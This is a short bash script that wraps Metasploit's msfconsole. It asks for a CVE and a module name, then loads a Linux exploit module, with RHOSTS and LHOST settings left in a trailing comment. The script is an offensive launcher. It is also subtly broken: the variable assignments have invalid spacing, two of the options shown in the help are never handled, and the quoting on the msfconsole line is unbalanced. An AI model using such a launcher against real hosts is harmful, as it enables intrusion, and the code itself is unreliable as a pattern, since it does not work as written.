#!/bin/bash

echo "starting script ... please wait"
sleep 1
read -p "enter name:" fullname
echo thank you $fullname
echo "starting next section ... please wait"
sleep 1

if [ "$1" == "-h" ];
	then
	echo help guidance:
	echo "		-t : http"
	echo "		-m : misc"
	echo "		-f : ftp"
	echo "		-o : other"
	exit 1
	fi

if [ "$1" == "-t" ];
	then
	TYPE = "http"
	read -p "CVE in form YYYY-####+ : " CVE
	fi
if [ "$1" == "-m" ];
	then
	TYPE = "misc"
	read -p "CVE in form YYYY-####+ :" CVE
	fi

read -p "module name : " module
echo "starting automation : "
echo " -----"
msfconsole -q -x "use exploit/linux/$TYPE/$module;" # set RHOSTS 192.168.1.3; set LHOST 192.168.2.2; exploit; exit;"

echo finished
